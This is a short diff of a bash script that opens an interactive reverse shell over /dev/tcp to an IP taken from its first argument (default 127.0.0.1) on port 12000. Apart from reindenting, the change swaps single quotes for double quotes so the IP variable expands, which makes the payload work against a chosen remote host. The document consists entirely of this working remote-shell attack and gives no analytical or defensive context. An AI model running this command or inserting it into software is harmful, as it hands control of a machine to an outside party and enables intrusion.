@@ -6,7 +6,7 @@
 
 ip="127.0.0.1"
 if [[ $1 != "" ]]; then
-  ip=$1
+    ip=$1
 fi
 
-/bin/bash -c 'bash -i >&/dev/tcp/${ip}/12000 0>&1'
+/bin/bash -c "bash -i >&/dev/tcp/${ip}/12000 0>&1"
